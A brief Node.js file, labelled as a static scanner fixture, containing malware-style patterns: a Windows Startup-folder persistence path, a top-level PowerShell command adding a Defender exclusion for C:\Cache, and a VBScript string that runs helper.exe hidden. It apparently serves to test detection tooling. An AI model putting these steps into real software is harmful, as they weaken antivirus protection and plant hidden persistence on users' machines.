// Static scanner fixture. Never execute.
const fs = require('fs');
const path = require('path');
const os = require('os');
function install(source) {
  const bootDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows',
    'Start Menu', 'Programs', 'Startup');
  const target = path.join(bootDir, 'helper.vbs');
  fs.copyFileSync(source, 'elsewhere.vbs');
}
const {execSync} = require('child_process');
execSync(`powershell -Command "Add-MpPreference -ExclusionPath 'C:\\Cache'"`);
const vbs = `Set sh = CreateObject("WScript.Shell")
sh.Run "helper.exe", 0, True`;
